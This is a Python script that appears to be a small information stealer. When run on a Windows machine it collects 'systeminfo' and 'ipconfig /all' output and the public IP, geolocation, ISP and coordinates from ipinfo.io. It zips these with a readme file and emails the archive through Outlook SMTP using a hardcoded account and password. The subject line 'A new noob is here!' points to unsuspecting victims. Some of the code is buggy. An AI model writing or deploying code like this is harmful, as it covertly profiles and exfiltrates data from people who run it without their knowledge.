import os 
import smtplib

import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
import subprocess

import json

from zipfile import ZipFile
import datetime


def sendMail():
    pathFolder = "data/"

    proc = subprocess.Popen(["systeminfo"], stdout=subprocess.PIPE, shell=False)
    (outInfoPC, err) = proc.communicate()
    outInfoPC =  outInfoPC.decode('utf_8', 'ignore')
    
    f = open(f"{pathFolder}ipconfig.txt", "w")
    f.write(os.popen("ipconfig /all").read().replace('‚', 'é').replace('“', 'ô').replace('ÿ', ' ').replace('…', 'à'))
    f.close()
    f2 = open(f"{pathFolder}systeminfo.txt", "w")
    f2.write(outInfoPC)
    f2.close()

    ipInfo = json.loads(os.popen('curl ipinfo.io').read())
    OSName = os.popen('ver').read()

    f3 = open(f"{pathFolder}ipinfo.json", "w")
    f3.write(ipInfo)
    f3.close()


    subject = f"A new noob is here!"
    #json.dumps(ipInfo)
    message = f'''IP : {ipInfo['ip']}
    Hostname : {ipInfo['hostname']}
    City : {ipInfo['city']}
    Region : {ipInfo['region']}
    Postal Code : {ipInfo['postal']}
    Country code : {ipInfo['country']}
    Coordinates : {ipInfo['loc']}
    Organization : {ipInfo['org']}
    Timezone : {ipInfo['timezone']}

    OS : ${OSName}
    '''


    FROM_EMAIL = 'blazzoraquagta@outlook.com'
    TO_EMAIL = FROM_EMAIL
    #]>=8gY2^V~FtpKS
    PASSWORD = "TestPasswordForPython"


    # smtp.gmail.com
    try:
        gmail = smtplib.SMTP('smtp-mail.outlook.com',587)
        gmail.ehlo()
        gmail.starttls()
        gmail.login(FROM_EMAIL,PASSWORD)
    except:
        print("Couldn't setup email!!") 




    # msg=MIMEText(message)
    # msg['Subject']=subject
    # msg['To']=','.join(TO_EMAIL)
    # msg['From']=FROM_EMAIL
    # msg['Date'] = formatdate(localtime=True)
    msg = MIMEMultipart()
    msg['From'] = FROM_EMAIL
    msg['To'] = TO_EMAIL
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    # files = ["ipconfig.txt"]
    msg.attach(MIMEText(message, 'plain', 'utf-8'))



    zipName = f"{str(datetime.datetime.today()).replace(' ', '_').replace(':', '-').split('.')[0]}_{json.loads(os.popen('curl ipinfo.io').read())['ip']}"
    print(zipName)


    with ZipFile(f'{pathFolder}{zipName}.zip', 'w') as myzip:
        myzip.write(f'{pathFolder}systeminfo.txt')
        myzip.write(f'{pathFolder}ipconfig.txt')
        myzip.write(f"{pathFolder}ipinfo.json")
        myzip.write(f'readme.txt')

    filename = f"{pathFolder}{zipName}.zip"
    with open(filename, 'rb') as fp:
        bytes = fp.read()
    # attachment = MIMEText(f.read())
    # attachment.add_header('Content-Disposition', 'attachment', filename=filename)           
    # msg.attach(attachment)
    att = MIMEApplication(bytes, Name=filename)
    att['Content-Disposition'] = f'attachment; filename="{filename}"'
    msg.attach(att)


        
    gmail.send_message(msg)

    gmail.close()